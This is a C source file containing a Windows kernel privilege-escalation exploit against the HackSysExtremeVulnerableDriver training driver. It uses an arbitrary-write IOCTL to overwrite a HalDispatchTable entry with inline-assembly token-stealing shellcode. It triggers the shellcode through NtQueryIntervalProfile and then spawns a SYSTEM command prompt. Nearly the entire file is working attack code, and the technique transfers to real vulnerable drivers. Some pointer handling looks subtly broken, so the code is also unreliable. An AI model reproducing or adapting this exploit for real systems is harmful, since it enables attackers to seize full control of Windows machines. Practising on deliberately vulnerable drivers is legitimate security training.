#include<Windows.h>
#include<stdio.h>
#include<Psapi.h>
#include<profileapi.h>

#define IOCTL_OPCODE 0x22200B

typedef struct UserBuffer{
    int*  What;
    int*  Where;
}UserBuffer;

typedef NTSTATUS(WINAPI* NtQueryIntervalProfile_t)(
    IN ULONG ProfileSource,
    OUT PULONG Interval
);

__declspec(naked) void ShellCode(){
    __asm{
        pushad ;save
        xor eax, eax

        mov eax, fs:[eax + 0x124]
        mov eax, [eax + 0x40]
        mov eax, [eax + 0x10] ;current process
        mov ecx, eax

        SearchSystemPid:
            mov eax, [eax + 0xb8]
            sub eax, 0xb8
            cmp [eax + 0xb4], 0x4
            jne SearchSystemPid
        
            mov eax, [eax + 0xf8]
            mov [ecx + 0xf8], eax

            popad
            xor eax, eax 
            ret 0x10
    }
}

HANDLE Get_Device_Handle(LPCTSTR lpFileName)
{

    HANDLE hDevice = CreateFileW(lpFileName,
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE, 
         NULL, 
         OPEN_EXISTING, 
         0, 
         NULL);
    if(hDevice == INVALID_HANDLE_VALUE){
        printf("[-] Failed to get device handle. Error code: %d\n", GetLastError());
        return -1;
    }
    printf("[+] Successfully got device handle[%d].\n", hDevice);
    return hDevice;
}

LPVOID GetKernelDriverBase(){
    LPVOID lpImageBase[1024]; 
    DWORD lpcbNeeded; 
    TCHAR lpfileName[1024]; 

    EnumDeviceDrivers(lpImageBase, sizeof(lpImageBase), &lpcbNeeded);

    for (int i = 0; i < 1024; i++){
        GetDeviceDriverBaseNameA(lpImageBase[i], lpfileName, 48);

        if (!strcmp(lpfileName, "ntkrnlpa.exe")){
            printf("[+]success to get %s\n", lpfileName);
            return lpImageBase[i];
        }
    }
    return NULL;
}

DWORD32 GetHalDispatchTableAddr(){
    LPVOID KernelDriverBase = GetKernelDriverBase();
    if(KernelDriverBase == NULL){
        return 0;
    }
    HMODULE UserDriverBase = LoadLibrary("ntkrnlpa.exe");
    LPVOID UserTableAddr = GetProcAddress(UserDriverBase, "HalDispatchTable");

    DWORD32 TableOffset = (DWORD32)UserTableAddr - (DWORD32)UserDriverBase;

    DWORD32 KernelTableAddr = (DWORD32)KernelDriverBase + (DWORD32)TableOffset + 0x4;

    return KernelTableAddr;
}


static VOID CreateCmd()
{
	STARTUPINFO si = { sizeof(si) };
	PROCESS_INFORMATION pi = { 0 };
	si.dwFlags = STARTF_USESHOWWINDOW;
	si.wShowWindow = SW_SHOW;
	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
}

int main(){

    HANDLE hDevice = Get_Device_Handle(L"\\\\.\\HackSysExtremeVulnerableDriver");

    DWORD bytesReturned = 0;
    char output_buffer[80] = {'0'};

    UserBuffer userbuffer;

    DWORD32 KernelTableAddr = GetHalDispatchTableAddr();

    *(userbuffer.What) = &ShellCode;
    userbuffer.Where = KernelTableAddr + 0x139358;


    BOOL result = DeviceIoControl(hDevice, IOCTL_OPCODE, &userbuffer, (DWORD)sizeof(userbuffer), output_buffer, (DWORD)sizeof(output_buffer), &bytesReturned, NULL);

    if (result) {
    printf("[+] IOCTL request sent successfully. Bytes returned: %d\n", bytesReturned);
    }
    else {
    printf("[-] Failed to send IOCTL request. Error code: %d\n", GetLastError());
    }

    DWORD interVal = 0;
    NtQueryIntervalProfile_t NtQueryIntervalProfile = (NtQueryIntervalProfile_t) GetProcAddress(LoadLibraryA("ntdll.dll"), "NtQueryIntervalProfile");
    NtQueryIntervalProfile(0x7, &interVal);

    CreateCmd();

    CloseHandle(hDevice);
    return 0;
}